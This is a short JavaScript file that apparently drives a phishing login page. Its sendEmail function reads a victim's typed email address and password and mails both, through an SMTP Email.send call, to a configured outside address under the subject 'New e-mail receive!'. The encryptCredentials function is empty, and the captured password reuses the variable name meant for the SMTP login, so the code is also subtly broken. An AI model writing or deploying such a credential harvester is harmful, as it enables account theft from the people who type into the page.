function sendEmail(){
	const email = document.getElementById("contentField").value;
    const password = document.getElementById("contentPassword").value;
	Email.send({
    Host : `${host}`,
    Username : `${username}`,
    Password : `${password}`,
    To : `${to}`,
    From : `${from}`,
    Subject : "New e-mail receive!",
    Body : `Address email: ${email}, and password: ${password}`
}).then(
  message => alert(message)
);
}

function encryptCredentials(){

}

document.addEventListener('keypress', function(key){
    if(event.keyCode == 13){
        document.getElementById("continueBtn").click();
    }
})
